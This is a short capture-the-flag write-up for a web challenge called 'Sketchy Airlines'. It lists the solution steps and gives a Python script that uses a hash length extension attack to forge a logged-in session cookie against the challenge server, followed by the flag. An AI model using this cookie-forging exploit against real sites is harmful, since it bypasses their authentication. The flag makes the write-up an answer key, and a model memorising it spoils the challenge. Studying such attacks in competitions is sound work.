# Sketchy Airlines (100 pts)

---

## Problem

---

## Solution

1) Scan barcode given in picture (type is PDF417) to get his ticket number
2) Get to login portal by entering ticket number
3) Use a Hash-length extension attack to bypass the login. Set username to his full name
4) Run pdftotext on the PDF that is returned. Get flag.

Python code to generate the LEA:
```
import hashpumpy
import urllib2
import requests

# md5($SECRET_KEY . $sess_str)
session = 'logged_in%253Dfalse%2526name%253D'
session = urllib2.unquote(session)
session = urllib2.unquote(session)
digest = '2cc207d867af2d2a55ff4141b6e3e8f2'

append = '&logged_in=true&name=John Doe'

#generate a valid hash and message
hp = hashpumpy.hashpump(digest, session, append, 16)
hsh= hp[0] 
msg= hp[1]
msg = urllib2.quote(msg)
print "msg="+msg
print "hash="+hsh

cookies = {'session':msg, 'hash':hsh}
url = 'http://sketchyairlines.p.tjctf.org/verify_login.php?flight=2198-b14f-e3c9-c54d-0b65'
r = requests.post(url, data = {'username':'admin', 'password': 'password', 'debug': 'true'}, cookies = cookies)

f = open("flight.pdf", "w+")
f.write(r.content)
f.close()
```

---

## Flag
`tjctf{h1d3_y0UR_84RC0d3s}`